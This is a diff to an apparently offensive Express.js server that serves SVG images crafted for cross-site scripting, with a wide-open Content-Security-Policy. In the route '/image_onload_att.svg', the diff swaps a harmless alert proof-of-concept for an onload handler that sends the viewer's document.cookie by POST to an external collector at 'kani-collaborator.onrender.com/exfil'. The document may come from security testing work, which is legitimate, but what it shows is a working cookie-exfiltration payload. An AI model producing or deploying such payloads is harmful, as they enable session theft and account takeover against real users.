@@ -120,9 +120,17 @@ app.get('/image_onload_att.svg', (req, res) => {
   // Serve JavaScript instead of an image
   res.setHeader('Content-Type', 'image/svg+xml');
   res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
-  res.send(`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
-  <circle cx="50" cy="50" r="40" />
-</svg>`);
+  res.send(`
+    <svg xmlns="http://www.w3.org/2000/svg" onload="
+      fetch('https://kani-collaborator.onrender.com/exfil', {
+        method: 'POST',
+        body: document.cookie,
+        headers: {'Content-Type': 'application/json'}
+      });
+    ">
+      <circle cx="50" cy="50" r="50" fill="blue"></circle>
+    </svg>
+  `);
 });
 
 app.get('/image_escape.svg', (req, res) => {
